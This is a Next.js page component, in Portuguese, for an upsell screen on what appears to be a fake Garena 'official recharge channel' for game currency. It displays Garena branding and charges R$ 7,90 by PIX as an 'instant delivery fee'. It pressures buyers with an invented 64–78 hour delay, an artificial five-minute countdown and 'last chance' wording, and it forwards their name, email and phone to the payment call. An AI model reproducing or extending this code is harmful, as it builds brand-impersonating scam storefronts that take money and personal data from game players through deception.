"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import "./upsell.css"; // 🔥 CSS separado

export default function UpsellPage() {
  const [selected, setSelected] = useState<string[]>(["offer1"]); // Skin já pré-selecionada
  const [checkoutData, setCheckoutData] = useState<any>({});
  const [countdown, setCountdown] = useState(0); // Adicionando contador
  const [isExpired, setIsExpired] = useState(false); // Verifica se a oferta expirou

// 🔥 Itens do upsell
const items = [
  { id: "offer1", name: "Taxa de Entrega Instantânea", price: 7.9, img: "/cs.jpg" },
];


  const total = items
    .filter((i) => selected.includes(i.id))
    .reduce((acc, i) => acc + i.price, 0);

    // Atualiza a contagem regressiva a cada segundo
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 0) {
          clearInterval(timer);
          setIsExpired(true); // Define como expirado
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    // Definindo o tempo inicial (🔥 agora 5 minutos certinho)
    setCountdown(300); // 5 minutos em segundos

    return () => clearInterval(timer); // Limpeza do intervalo
  }, []);


  // ✅ Carregar dados do checkout salvos no sessionStorage
  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedData = sessionStorage.getItem("checkoutData");
      if (storedData) {
        setCheckoutData(JSON.parse(storedData));
      }
    }
  }, []);

  const handlePayment = async () => {
    if (total <= 0) {
      alert("Selecione pelo menos uma skin!");
      return;
    }

    const amountCents = Math.round(total * 100); // ✅ só o valor das skins
    const orderId = Date.now().toString();
    const description = `Oferta - Pedido #${orderId}`; // ✅ descrição clara

    const payer = {
      name: checkoutData?.name || "",
      email: checkoutData?.email || "",
      phone: checkoutData?.phone || "",
    };

    // Preparando as informações do checkout para enviar para o "buy"
    const checkoutDataToSend = {
      originalPrice: items[0].price, // Preço Original (se necessário)
      totalPrice: total, // Total (preço com a oferta)
      diamonds: items[0].name, // Nome do item (ex: 5.600 Diamantes)
    };

    try {
      const response = await fetch("/api/checkout", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ amount: amountCents, orderId, description, payer }),
      });

      const data = await response.json();

      if (!response.ok || !data.id) {
        alert("Erro ao gerar PIX.");
        return;
      }

// Pega o userId do accountData no localStorage
let userId = "Desconhecido";
if (typeof window !== "undefined") {
  const accountData = localStorage.getItem("accountData");
  if (accountData) {
    try {
      const acc = JSON.parse(accountData);
      if (acc.userId || acc._id) {
        userId = acc.userId || acc._id; // pega tanto userId quanto _id
      }
    } catch (e) {
      console.error("Erro ao parsear accountData", e);
    }
  }
}

// ✅ Salvar só os dados novos do upsell
const checkoutUpsellPix = {
  type: "upsell",
  items: items.filter((i) => selected.includes(i.id)),
  total,
  price: total.toFixed(2),
  transactionId: data.id,
  brcode: data.brcode,
  qrBase64: data.qrBase64,
  createdAt: Date.now(),
  payer,
  ...checkoutDataToSend,
  userId // 🔥 agora vai junto
};

sessionStorage.setItem("pixCheckout", JSON.stringify(checkoutUpsellPix));



      // Redireciona para a página de pagamento
      setTimeout(() => {
        window.location.href = "/buy";
      }, 1500);
    } catch (err) {
      alert("Falha na integração PIX.");
    }
  };

useEffect(() => {
  if (typeof window !== "undefined" && (window as any).gtag) {
    (window as any).gtag("event", "conversion", {
      send_to: "AW-17561727277/oYQ-CKL67ZwbEK3iirZB",
      value: total || 0.0, // 🔥 valor real da compra
      currency: "BRL",
      transaction_id: checkoutData?.orderId || Date.now().toString(), // 🔥 id único
    });
  }
}, [checkoutData, total]);


  return (
    <main>
<header>
  <div className="container nav">
    <div
      className="brand"
      style={{ cursor: "pointer" }}
      onClick={() => (window.location.href = "/")}
    >
      <div className="brand-text">
        <Image src="/image.png" alt="Garena Logo" width={100} height={40} />
        <span className="divider"></span>
        <span>Canal Oficial de Recarga</span>
      </div>
    </div>
    <div className="profile" title="Perfil">
      <Image
        src="/ff.webp"
        alt="Perfil"
        width={40}
        height={40}
        className="rounded-full object-cover"
      />
    </div>
  </div>
</header>


   <div className="checkout">
  {countdown <= 180 && <h2>ÚLTIMA CHANCE!</h2>}
  <h4>Entrega Prioritária</h4>
  <p className="subtext">
    Nossa equipe pode levar de <strong>64 a 78 horas</strong> para processar sua recarga, 
    devido à alta demanda.  
    <br />Mas se você não quer esperar, temos uma solução:
  </p>

  <div className="highlight-box">
    <p>
      Por apenas <span className="highlight-price">R$ 7,90</span> você garante 
      <strong> entrega instantânea</strong>, com prioridade máxima no sistema.  
      <br />Um membro da equipe vai processar seu pedido imediatamente.
    </p>
  </div>

  <div className="countdown">
    <p>Oferta válida apenas enquanto este cronômetro estiver ativo:</p>
    <span>{`${Math.floor(countdown / 60)
      .toString()
      .padStart(2, "0")}:${(countdown % 60).toString().padStart(2, "0")}`}</span>
  </div>

  <div className="offer-container">
    <div className="offer-item">
      <div className="offer-left">
        <Image 
          src="/cs.jpg"
          alt="Entrega Rápida"
          width={70}
          height={70}
          quality={100}
        />
        <div className="offer-info">
          <h3>Taxa de Entrega Instantânea</h3>
          <span>R$ 7,90</span>
        </div>
      </div>
    </div>
  </div>

  <button className="btn-submit" onClick={handlePayment}>
    Sim, Quero Minha Recarga Agora
  </button>

  <a href="/" className="no-thanks">
    Prefiro esperar até 78h
  </a>
</div>


      {/* FOOTER */}
      <footer className="footer">
        <div className="container footer-inner">
          <span>© 2025 Garena Online. Todos os direitos reservados.</span>
          <div className="footer-links">
            <a href="#">FAQ</a>
            <a href="#">Termos e Condições</a>
            <a href="#">Política de Privacidade</a>
          </div>
        </div>
      </footer>
    </main>
  );
}
